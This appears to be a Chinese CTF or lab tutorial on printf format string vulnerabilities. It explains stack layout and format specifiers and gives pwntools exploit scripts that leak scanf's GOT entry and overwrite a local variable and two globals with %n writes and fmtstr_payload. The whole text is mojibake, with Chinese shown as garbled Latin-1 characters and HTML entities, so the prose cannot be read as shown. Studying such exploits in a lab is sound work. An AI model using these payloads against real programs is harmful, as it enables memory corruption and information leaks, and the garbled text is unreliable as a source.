å°†å·²è¾“å‡ºå­—ç¬¦æ•°å†™å…¥æ ˆä¸Šçš„åœ°å€ %nâ†’ å†™å…¥0x4åˆ°æŒ‡å®šåœ°å€ %$p&#x2F;%%$s æŒ‡å®šç¬¬å‡ ä¸ªå‚æ•°ä½ç½®çš„å€¼ %4$pâ†’ ç¬¬ 4 ä¸ªå‚æ•° %% è¾“å‡ºä¸€ä¸ª%å­—ç¬¦æœ¬èº« %%â†’% å½“ç”¨æˆ·æ§åˆ¶äº† printf() çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰ï¼Œè€Œç¨‹åºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–é™åˆ¶ï¼Œå°±å¯èƒ½é€ æˆä»¥ä¸‹é—®é¢˜ï¼š 123char input[100];fgets(input, sizeof(input), stdin);printf(input); // âš ï¸ å±é™©ï¼ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸² æ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ è¾“å…¥ï¼Œå¦‚ï¼š %x %x %x %x %s ç¨‹åºä¼šå°è¯•ä»æ ˆä¸­è¯»å–å‚æ•°ï¼Œä½†ç”±äºæ²¡æœ‰æä¾›å‚æ•°åˆ—è¡¨ï¼Œprintf() ä¼šç»§ç»­ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´ï¼š æ³„éœ²æ ˆå†…å­˜å†…å®¹ï¼ˆå¦‚è¿”å›åœ°å€ã€canaryã€å‡½æ•°æŒ‡é’ˆç­‰ï¼‰ å†™å…¥å†…å­˜ï¼ˆé€šè¿‡ %n æ ¼å¼ç¬¦ï¼‰ è™½ç„¶æ²¡æœ‰å†™ä»»ä½•å‚æ•°ï¼Œä½†è¿˜æ˜¯ä¼šå¯¹åº”åœ°è§£æå‚æ•°ï¼Œå› ä¸ºåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­å†™äº†å¯¹åº”çš„è§£ææ–¹å¼ï¼Œæ‰€ä»¥åœ¨åç»­çš„å‡½æ•°è¿è¡Œä¸­ä¼šè§£ææ ˆä¸Šçš„å…ƒ ç´ ã€‚å¯¹äºæ•´å‹å€¼å’Œæµ®ç‚¹å€¼ï¼Œè¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä¸ç®¡æ ˆä¸Šæ˜¯ä»€ä¹ˆæ•°æ®éƒ½èƒ½å¤ŸæŒ‰ç…§æ•´å‹å€¼å’Œæµ®ç‚¹å€¼è§£æå‡ºæ¥ï¼Œè€Œå­—ç¬¦ä¸²å½¢å¼å°±ä¸ä¸€å®šèƒ½è§£æå‡ºæ¥ äº†ã€‚å¦‚æœæ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œæ¯”å¦‚NULLï¼Œé‚£ä¹ˆåœ¨è§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œ å› ä¸ºè¿™ä¸ªåœ°å€æŒ‰ç…§å­—ç¬¦ä¸²è§£ææ˜¯æ— æ³•è§£æå‡ºæ¥çš„ï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸºæœ¬åŸç† åˆ©ç”¨leakmemory(æ³„éœ²æ ˆä¸Šå†…å®¹) ç”¨äº† %100s æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºï¼Œä½†å¹¶æ²¡æœ‰é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ ¼å¼ç¬¦å†…å®¹ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š ç”¨æˆ·å¯ä»¥è¾“å…¥ %xã€%sã€%n ç­‰æ ¼å¼ç¬¦ã€‚ printf ä¼šæ ¹æ®è¿™äº›æ ¼å¼ç¬¦ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²æˆ–ä»»æ„åœ°å€å†™å…¥ã€‚ leakmemory(æ³„éœ²ä»»æ„åœ°å€å†…å­˜)è¿™é‡Œçš„ç›®æ ‡è®¾ç«‹æ³„éœ²isoc99_scanfå‡½æ•°ï¼ˆscanfç¼–è¯‘ä¹‹åæ˜¯isoc99_scanfåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼‰ã€‚ %k$s è¿™é‡Œçš„pæ˜¯å¯ä»¥æ›´æ¢çš„ï¼Œæ¯”å¦‚æ›´æ¢ä¸ºså°±å¯ä»¥è§£ææ ˆä¸Šçš„æ•°æ®ä¸ºå­—ç¬¦ä¸²ã€‚ kï¼šè¡¨ç¤ºè¦æ‰“å°çš„å‚æ•°è·ç¦»ç›®å‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„è·ç¦»ã€‚ å› ä¸ºåœ¨æ²¡æœ‰ç»™printfæä¾›å¯¹åº”çš„å­—ç¬¦ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªå¯å˜å‚æ•°å‡½æ•° ï¼Œå®ƒä¼šä»æ ˆä¸Šä¾æ¬¡è¯»å–æ•°æ®æ¥å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ %pã€%xã€%sã€%n ç­‰æŒ‡ä»¤ã€‚ ä½†ä½ å¹¶ä¸çŸ¥é“ä½ è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„å…·ä½“ä½ç½®ï¼Œæ‰€ä»¥ä½ éœ€è¦ï¼š æ‰¾åˆ°ä½ çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„åç§»é‡ï¼Œæ‰èƒ½ç²¾å‡†æ§åˆ¶è¯»å†™çš„å†…å®¹ã€‚ æ‰€ä»¥åç§»é‡å°±æ˜¯4 æ‰€ä»¥æ„é€ payload &#x3D; p32(scanf_got) + â€œ%4$sâ€ ç›¸å½“äºprint(p32(scanf_got) + â€œ%4$sâ€) æ‰€ä»¥å‰å››ä¸ªå­—èŠ‚æ˜¯è¾“å‡ºçš„scanfçš„gotè¡¨ ğŸ§  å…³é”®åŒºåˆ«ï¼šåœ°å€ vs åœ°å€çš„å†…å®¹ scanf_got GOT è¡¨ä¸­scanfçš„åœ°å€ï¼ˆ.gotæ®µä¸­çš„ä¸€ä¸ªä½ç½®ï¼‰ 0x804a008 å°±åƒä¹¦çš„ç›®å½•é¡µç  æ³„éœ²çš„åœ°å€ï¼ˆleak_addrï¼‰ è¿™ä¸ª GOT è¡¨é¡¹ä¸­å­˜å‚¨çš„å€¼ï¼ˆå³scanfçš„å®é™…åœ°å€ï¼‰ 0xf7e01234 å°±åƒç›®å½•é¡µç æŒ‡å‘çš„é‚£ä¸€é¡µçš„å†…å®¹ è„šæœ¬1234567891011121314from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive() printf æ‰§è¡Œæµç¨‹ï¼š printf ä¼šä»æ ˆä¸Šè¯»å–å‚æ•°ï¼› å®ƒçœ‹åˆ° %4$sï¼Œä¼šä»ç¬¬ 4 ä¸ªå‚æ•°ä½ç½®è¯»å–ä¸€ä¸ªåœ°å€ï¼› è¿™ä¸ªåœ°å€æ˜¯ 0x804a018ï¼ˆä½ å†™å…¥çš„ GOT åœ°å€ï¼‰ï¼› ç„¶åä» 0x804a018 åœ°å€ä¸­è¯»å‡ºä¸€ä¸ªæŒ‡é’ˆï¼ˆæ¯”å¦‚ 0xf7e01234ï¼Œå³ scanf çš„è¿è¡Œæ—¶åœ°å€ï¼‰ï¼› %s ä¼šä» 0xf7e01234 å¼€å§‹è¯»å–å­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ° \\0ï¼› æœ€ç»ˆä½ æ¥æ”¶åˆ°çš„æ•°æ®ä¸­åŒ…å« 0xf7e01234ã€‚ ğŸ“Œ æ€»ç»“ elf.got[&quot;scanf&quot;]å’Œelf.got[&quot;__isoc99_scanf&quot;]ä¸€æ ·å—ï¼Ÿ ä¸ä¸€å®šï¼Œå–å†³äºç¼–è¯‘å™¨ ä¸ºä»€ä¹ˆä¼šæœ‰__isoc99_scanfï¼Ÿ GCC ç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒ C99 æ ‡å‡†å¼•å…¥çš„ æ€ä¹ˆç¡®è®¤ç”¨å“ªä¸ªï¼Ÿ ç”¨readelf -ræˆ–objdump -TRæŸ¥çœ‹ GOT è¡¨ èƒ½ä¸èƒ½æ›¿æ¢ï¼Ÿ åªæœ‰ GOT è¡¨ä¸­å­˜åœ¨å¯¹åº”ç¬¦å·æ—¶æ‰èƒ½æ›¿æ¢ å¦‚æœå†™é”™äº†ä¼šæ€æ ·ï¼Ÿ æŠ¥é”™ï¼šKeyError å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹ğŸŒŸ é˜¶æ®µ 0ï¸âƒ£ï¼šåœ¨ vulnfunc é‡Œï¼ˆè°ƒç”¨ printf ä¹‹å‰ï¼‰ è¿™æ˜¯å·²ç»åœ¨ vulnfunc é‡Œï¼Œä¸”æ ˆå¸§å·²ç»å»ºç«‹å¥½äº†ã€‚ æ ˆé¡¶åœ¨ espï¼Œæ ˆä½åœ¨é«˜åœ°å€æ–¹å‘ã€‚ 12345678910111213 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆå¯èƒ½æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼‰ || å‚æ•°2 || å‚æ•°1 |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc çš„ ebp)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ || â€¦ | â† esp ï¼ˆåœ¨ vulnfunc é‡Œï¼‰ â†“ ä½åœ°å€ å½“ä½ åˆšè¿›å…¥ vulnfuncï¼š ebp â†’ ä¸Šä¸€ä¸ª ebp ebp+4 â†’ è¿”å›åœ°å€ï¼ˆè¿”å›åˆ° mainï¼‰ ebp-xx â†’ vulnfunc çš„å±€éƒ¨å˜é‡ esp â†’ æœ€ä½å¤„ï¼ŒæŒ‡å‘å±€éƒ¨å˜é‡ ğŸŒŸ é˜¶æ®µ 1ï¸âƒ£ï¼šè°ƒç”¨ printf(format) å½“ vulnfunc è°ƒç”¨ï¼š 12printf(format); è°ƒç”¨è€…æŠŠè¿”å›åœ°å€ &amp; å‚æ•°å‹å…¥æ ˆï¼š 1234567891011121314 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰ || â€¦ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format | â† esp+4| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡ | â† esp â†“ æ­¤æ—¶ esp æŒ‡å‘ printf çš„è¿”å›åœ°å€ï¼Œå†å¾€ä¸Šæ˜¯ printf çš„å‚æ•°ã€‚ ğŸŒŸ é˜¶æ®µ 2ï¸âƒ£ï¼šè¿›å…¥ printf å åœ¨ printf å¼€å§‹æ‰§è¡Œåï¼Œå®ƒå»ºç«‹è‡ªå·±çš„æ ˆå¸§ï¼š 1234567891011121314151617 â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰ || â€¦ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| è¿”å›åœ°å€ â†’ main |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| ä¸Šä¸€ä¸ª ebp | â† ebp (vulnfunc)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| vulnfunc å±€éƒ¨å˜é‡ |â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| å‚æ•°1=format | â† ebp+8| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡ | â† ebp+4| ä¸Šä¸€ä¸ª ebp | â† ebp (printf)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| printf å±€éƒ¨å˜é‡ | â† esp â†“ è¿™é‡Œï¼š printf æŠŠå½“å‰çš„ ebp å‹æ ˆ æŠŠ ebp è®¾ç½®ä¸º esp esp å†å‘ä¸‹ç•™å‡ºå±€éƒ¨å˜é‡ç©ºé—´ scanfå‡½æ•°ä¼šæŠŠè¯»å–åˆ°çš„æ•°æ”¾åœ¨æ ˆä¸Šä¸€ä¸ªç©ºé—´ï¼Œç„¶å%pä¼šæŠŠå®ƒæ³„éœ²å‡ºæ¥ ä½¿ç”¨ scanf è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæœ€å¤š 100 å­—èŠ‚ï¼‰ï¼Œå­˜å…¥ format ç¼“å†²åŒºï¼› ç„¶åç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ ç»™ printfï¼Œå³ï¼šprintf(format); overwrite(è¦†ç›–ä»»æ„åœ°å€å†…å­˜) æ‰€ä»¥è¿™é“é¢˜çš„é‡ç‚¹æ˜¯ä¿®æ”¹å‡ ä¸ªæ•°çš„å€¼ 1ï¼‰å°†aè¦†ç›–ä¸º0x10ã€‚ 2ï¼‰å°†bè¦†ç›–ä¸º2ã€‚ 3ï¼‰å°†cè¦†ç›–ä¸º0x12345678ã€‚ å…¶ä¸­aæ˜¯å±€éƒ¨å˜é‡ï¼Œb,cæ˜¯å…¨å±€å˜é‡ å±€éƒ¨å˜é‡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨æ•°æ®æ®µä¸­ï¼ˆåˆ†ä¸ºå·²åˆå§‹åŒ–rodataå’Œæœªåˆå§‹åŒ–bssä¸¤éƒ¨åˆ†ï¼‰ 12345678910111213141516171819202122232425262728+---------------------+ &lt;--- é«˜å†…å­˜åœ°å€| å‘½ä»¤è¡Œå‚æ•° &amp; ç¯å¢ƒå˜é‡ |+---------------------+| æ ˆ (Stack) | &lt;-- å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›åœ°å€| || Function Call N || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| Function Call 2 || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| Function Call 1 || (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|| ... || || ç©ºé—² || |+---------------------+| å † (Heap) | &lt;-- åŠ¨æ€åˆ†é…å†…å­˜ (malloc/new)| || ... |+---------------------+| .bss æ®µ (æœªåˆå§‹åŒ–æ•°æ®) | &lt;-- æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: b)+---------------------+| .data æ®µ (å·²åˆå§‹åŒ–æ•°æ®) | &lt;-- å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: c)+---------------------+| .text æ®µ (ä»£ç ) | &lt;-- ç¨‹åºæ‰§è¡Œä»£ç  (æŒ‡ä»¤)+---------------------+| ä¿ç•™åŒºåŸŸ |+---------------------+ &lt;--- ä½å†…å­˜åœ°å€ açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰é¦–å…ˆï¼Œaæ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„ï¼Œå…¶åœ°å€ä¼šå› ä¸ºå¼€å¯ASLRè€Œå˜åŒ–ï¼Œæ‰€ä»¥åœ¨å‡½æ•°ä¸­å°†açš„åœ°å€æ‰“å°å‡ºæ¥äº† è„šæœ¬12345678from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m) intå’Œu32() å‡½æ•° int(..., 16) æ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„åœ°å€ï¼ˆå¦‚&quot;0xffa79dbc&quot;ï¼‰ è½¬æ¢ä¸ºæ•´æ•°åœ°å€ ä¸»åŠ¨æ³„éœ²åœ°å€ u32(...) æ¥æ”¶åˆ°çš„æ˜¯åŸå§‹ 4 å­—èŠ‚æ•°æ®ï¼ˆå¦‚b&#39;\\xbc\\x9d\\xa7\\xff&#39;ï¼‰ å°†å°ç«¯åºçš„ 4 å­—èŠ‚è½¬ä¸ºæ•´æ•° è°ƒç”¨æ³„éœ²åœ°å€ ğŸ§© p32(a_addr) æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ æ„é€ çš„ p32(a_addr) ä¼šè¢« printf å½“ä½œä¸€ä¸ªå‚æ•°å¤„ç†ï¼š å®ƒè¢«å‹å…¥æ ˆä¸Šï¼› %8$n ä¼šä»ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®è¯»å–å®ƒï¼› è¿™ä¸ªåœ°å€å°±æ˜¯å†™å…¥çš„ç›®æ ‡åœ°å€ã€‚ ğŸ§© %12c æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿï¼ˆç›®æ ‡æ˜¯16ï¼Œaçš„åœ°å€å å››ä¸ªå­—èŠ‚ï¼‰ %12c è¾“å‡º 12 ä¸ªå­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ï¼‰ï¼› %n ä¼šæŠŠå½“å‰è¾“å‡ºçš„å­—ç¬¦æ€»æ•°å†™å…¥æŒ‡å®šåœ°å€ï¼› æ‰€ä»¥ %12c çš„ä½œç”¨æ˜¯è®© %n å†™å…¥ 12ï¼› å®ƒæœ¬èº«ä¸å†™å…¥å†…å­˜ï¼Œä½†ä¼šå½±å“ %n çš„å€¼ã€‚ ä¸èƒ½æ¢æˆbâ€™aâ€™*12,è¿™ä¸ªä¸ä¼šå½±å“%nçš„æ€»æ•° å·¥ä½œåŸç†ï¼š å½“ printf(payload) æ‰§è¡Œæ—¶ï¼Œpayload å­—ç¬¦ä¸²ä¼šè¢«æ”¾åˆ°æ ˆä¸Šã€‚ printf å¼€å§‹è§£æ payloadã€‚å®ƒä¼šæŠŠ p32(a_addr) è§†ä¸ºä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼ˆä½†å®ƒå®é™…ä¸Šæ˜¯ v1 çš„åœ°å€ï¼‰ã€‚ ç„¶åé‡åˆ° %12cï¼Œå®ƒè¾“å‡º 12 ä¸ªå­—ç¬¦ã€‚ æ¥ç€é‡åˆ° %8$nã€‚æ­¤æ—¶ printf å·²ç»è¾“å‡ºäº† 12 ä¸ªå­—ç¬¦ã€‚å®ƒä¼šå»æ ˆä¸Šå¯»æ‰¾ç¬¬ 8 ä¸ªå‚æ•°çš„åœ°å€ã€‚ç”±äº p32(a_addr) æ”¾åœ¨äº† payload çš„å¼€å¤´ï¼Œå¹¶ä¸”å…¶é•¿åº¦æ˜¯ 4 å­—èŠ‚ï¼Œå®ƒä¼šæ­£å¥½è½åœ¨æ ˆä¸Šç¬¬ 8 ä¸ªå‚æ•°çš„ä½ç½®ä¸Šï¼ˆè¿™ä¸ªåç§»é‡æ˜¯ç»è¿‡è°ƒè¯•ç¡®å®šçš„ï¼‰ã€‚ printf ä¼šå°†å½“å‰å·²è¾“å‡ºçš„å­—ç¬¦æ•° 12 å†™å…¥åˆ° p32(a_addr) æ‰€è¡¨ç¤ºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ v1 çš„åœ°å€ã€‚ æœ€ç»ˆï¼Œv1 çš„å€¼è¢«ä¿®æ”¹ä¸º 12ã€‚ bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰ b,cçš„åœ°å€å¯ä»¥ç›´æ¥æ‰¾åˆ° è„šæœ¬1234567891011121314from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info: print(b&quot;Success\\n&quot;)p.interactive() ä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ç…§è¦†ç›– a çš„æ–¹æ³•ï¼Ÿï¼ˆå› ä¸º%nï¼Œbçš„åœ°å€å·²ç»è¶…è¿‡2äº†ï¼Œæ‰€ä»¥bçš„åœ°å€åªèƒ½åœ¨%_$nä¹‹åï¼‰ åç§»é‡è®¡ç®—çš„å·®å¼‚ï¼š åœ¨è¦†ç›– a çš„æ–¹æ³•ä¸­ï¼Œp32(a_addr) æ”¾åœ¨äº† payload çš„æœ€å¼€å¤´ï¼Œå¹¶ä¸” printf å‘ç°è¿™ä¸ªå¼€å¤´åœ¨å®ƒçš„å‚æ•°åˆ—è¡¨ä¸­æ˜¯ç¬¬ 8 ä¸ªã€‚ ä½†æ˜¯ï¼Œå¦‚æœå°† p32(b_addr) ä¹Ÿæ”¾åœ¨ payload çš„å¼€å¤´å¹¶å°è¯•ç”¨ %8$n å†™å…¥ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ï¼š åœ°å€å€¼ä¸æ ¼å¼ç¬¦å†²çªï¼š0x0804A028 è¿™ä¸ªåœ°å€æœ¬èº«å¦‚æœè¢« printf è§£ææˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå¯èƒ½ä¼šåŒ…å« % æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´ printf å´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œåœ°å€çš„æŸä¸ªå­—èŠ‚å¯èƒ½è¢«è§£é‡Šä¸º %s æˆ– %x çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´ printf è¯•å›¾è¯»å–æ— æ•ˆçš„å†…å­˜åœ°å€ã€‚ æ§åˆ¶æ€§é—®é¢˜ï¼šæˆ‘ä»¬é€šå¸¸å¸Œæœ›å°†è¦å†™å…¥çš„åœ°å€æ”¾åœ¨æ ¼å¼å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢« printf è¯¯è®¤ä¸ºæ˜¯æ ¼å¼ç¬¦çš„ä¸€éƒ¨åˆ†æ¥å¤„ç†ï¼Œè€Œåªæ˜¯ä¸€ä¸ªæ™®é€šçš„ 4 å­—èŠ‚æ•°æ®ã€‚ ç‰¹æ€§ è¦†ç›– v1 (å±€éƒ¨å˜é‡) è¦†ç›– b (å…¨å±€å˜é‡) ç›®æ ‡ç±»å‹ æ ˆä¸Šçš„å±€éƒ¨å˜é‡ æ•°æ®æ®µä¸Šçš„å…¨å±€å˜é‡ åœ°å€æ¥æº è¿è¡Œæ—¶æ³„éœ² (æ¯æ¬¡å¯èƒ½ä¸åŒ) é™æ€å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®š) p32(addr) ä½ç½® æ”¾åœ¨ payload çš„å¼€å¤´ æ”¾åœ¨ payload çš„æœ«å°¾ %n åç§» 8$ (å› ä¸ºåœ°å€æ”¾åœ¨å¼€å¤´ï¼Œä¸”åœ¨ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®) 10$ (å› ä¸ºåœ°å€æ”¾åœ¨æœ«å°¾ï¼Œä¸”åœ¨ç¬¬ 10 ä¸ªå‚æ•°ä½ç½®) ä¸»è¦è€ƒé‡ ç¡®ä¿ p32(addr) ä¸è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œä¸”åœ¨æ­£ç¡®åç§» é¿å… b_addr å­—èŠ‚è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œæ›´ç¨³å®šåœ°ä½œä¸ºå‚æ•°åœ°å€ å¥½çš„ï¼Œå¦‚æœä½ ç¡®è®¤è¿™ä¸ª b æ˜¯å¿…é¡»çš„ï¼Œé‚£ä¹ˆå®ƒåœ¨ payload ä¸­çš„å­˜åœ¨ï¼Œå°±æ„å‘³ç€å®ƒåœ¨æ ˆçš„å¸ƒå±€å’Œ printf å¯¹å‚æ•°çš„è§£æä¸­èµ·åˆ°äº†å…³é”®ä½œç”¨ï¼Œé€šå¸¸æ˜¯ä¿è¯äº† p32(b_addr) çš„æ­£ç¡®å¯¹é½ï¼Œä½¿å…¶è½åœ¨ %10$n é¢„æœŸçš„å‚æ•°ä½ç½®ã€‚ è®©æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æï¼Œä¸ºä»€ä¹ˆå¤šä¸€ä¸ª b åè€Œå¯èƒ½æˆä¸ºâ€œå¿…é¡»çš„â€ã€‚ æœ‰ b çš„è¯¦ç»†åˆ†æ 1payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr) è®©æˆ‘ä»¬è®¡ç®—æ¯ä¸ªéƒ¨åˆ†çš„é•¿åº¦ï¼š b&quot;aa&quot;ï¼š2 å­—èŠ‚ b&quot;%10$n&quot;ï¼š5 å­—èŠ‚ b&quot;b&quot;ï¼š1 å­—èŠ‚ p32(b_addr)ï¼š4 å­—èŠ‚ (å‡è®¾ b_addr æ˜¯ 0x0804A028) æ€»å­—èŠ‚æ•° &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 å­—èŠ‚,åœ¨è¿™é‡Œï¼Œbæ˜¯ä¸ºäº†è¡¥è¶³å­—èŠ‚ cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰ è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè€ƒè™‘é€å­—èŠ‚å†™å…¥ è¿™é‡Œæƒ³æŠŠcè¦†ç›–ä¸º0x12345678ï¼Œè€Œcçš„åœ°å€æ˜¯0x0804A02Cï¼Œæ‰€ä»¥åŸºæœ¬ç›®æ ‡æ˜¯ï¼š 12340x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12 è„šæœ¬1234567891011121314from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info: print(b&quot;Success&quot;)p.interactive() fmtstr_payloadfmtstr_payload æ˜¯ pwntools æä¾›çš„ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…· ï¼Œç”¨äºæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆFormat String Vulnerabilityï¼‰çš„ payload ã€‚ 